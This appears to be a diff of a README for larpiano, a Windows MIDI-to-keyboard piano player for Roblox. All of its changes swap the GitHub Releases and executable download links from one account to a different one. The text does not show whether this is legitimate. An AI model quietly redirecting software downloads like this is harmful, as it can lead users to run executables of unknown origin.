@@ -5,7 +5,7 @@ Windows MIDI-to-keyboard piano player for Roblox pianos — *from da people who 
 **larpiano** plays MIDI files on virtual pianos in Roblox by dispatching physical Windows keyboard scan codes. It includes an authentic dark desktop UI, integrated non-activating floating overlay, song library, online MIDI discovery, audio-to-MIDI extraction, and customizable mapping profiles.
 
 Website: https://larpiano.portways.app/  
-GitHub Releases: https://github.com/ojeshfrrr/larpiano/releases
+GitHub Releases: https://github.com/xhakkurw233/larpiano/releases
 
 ---
 
@@ -21,9 +21,9 @@ GitHub Releases: https://github.com/ojeshfrrr/larpiano/releases
 
 ## Download
 
-Download the self-contained Windows x64 ZIP from [GitHub Releases](https://github.com/ojeshfrrr/larpiano/releases/latest):
+Download the self-contained Windows x64 ZIP from [GitHub Releases](https://github.com/xhakkurw233/larpiano/releases/latest):
 
-1. Download `larpiano-windows-x64.zip` from [v1.0.35 Release](https://github.com/ojeshfrrr/larpiano/releases/tag/v1.0.35).
+1. Download `larpiano-windows-x64.zip` from [v1.0.35 Release](https://github.com/xhakkurw233/larpiano/releases/tag/v1.0.35).
 2. Extract the archive to any folder.
 3. Run `Keynote.App.exe`. No separate .NET runtime installation is required.
 
